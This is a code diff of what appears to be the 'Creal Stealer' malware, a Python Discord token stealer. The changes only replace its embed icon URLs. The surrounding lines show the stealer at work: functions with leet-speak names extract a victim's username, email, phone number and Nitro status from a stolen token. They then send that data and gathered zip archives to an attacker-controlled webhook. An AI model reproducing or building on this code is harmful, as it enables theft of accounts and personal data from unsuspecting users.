@@ -356,7 +356,7 @@ def upl05dT4k31(t0k3n, path):
     us3rn4m1, hashtag, em31l, idd, pfp, flags, n1tr0, ph0n3 = G3tT0k4n1nf9(t0k3n)
 
     if pfp == None: 
-        pfp = "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg"
+        pfp = "https://i.imgur.com/S0Zqp4R.jpg"
     else:
         pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}"
 
@@ -416,14 +416,14 @@ def upl05dT4k31(t0k3n, path):
                 },
             "footer": {
                 "text": "Creal Stealer",
-                "icon_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg"
+                "icon_url": "https://i.imgur.com/S0Zqp4R.jpg"
                 },
             "thumbnail": {
                 "url": f"{pfp}"
                 }
             }
         ],
-        "avatar_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg",
+        "avatar_url": "https://i.imgur.com/S0Zqp4R.jpg",
         "username": "Creal Stealer",
         "attachments": []
         }
@@ -457,7 +457,7 @@ def upload(name, link):
                     "color": 2895667,
                     "footer": {
                         "text": "Creal Stealer",
-                        "icon_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg"
+                        "icon_url": "https://i.imgur.com/S0Zqp4R.jpg"
                     }
                 }
             ],
@@ -483,12 +483,12 @@ def upload(name, link):
                     "color": 2895667,
                     "footer": {
                         "text": "Creal Stealer",
-                        "icon_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg"
+                        "icon_url": "https://i.imgur.com/S0Zqp4R.jpg"
                     }
                 }
             ],
             "username": "Creal",
-            "avatar_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg",
+            "avatar_url": "https://i.imgur.com/S0Zqp4R.jpg",
             "attachments": []
             }
         L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)
@@ -511,12 +511,12 @@ def upload(name, link):
                 },
                 "footer": {
                     "text": "Creal Stealer",
-                    "icon_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg"
+                    "icon_url": "https://i.imgur.com/S0Zqp4R.jpg"
                 }
                 }
             ],
             "username": "Creal Stealer",
-            "avatar_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg",
+            "avatar_url": "https://i.imgur.com/S0Zqp4R.jpg",
             "attachments": []
             }
         L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)
@@ -711,12 +711,12 @@ def GatherZips(paths1, paths2, paths3):
             "color": 2895667,
             "footer": {
                 "text": "Creal Stealer",
-                "icon_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg"
+                "icon_url": "https://i.imgur.com/S0Zqp4R.jpg"
             }
             }
         ],
         "username": "Creal Stealer",
-        "avatar_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg",
+        "avatar_url": "https://i.imgur.com/S0Zqp4R.jpg",
         "attachments": []
     }
     L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)
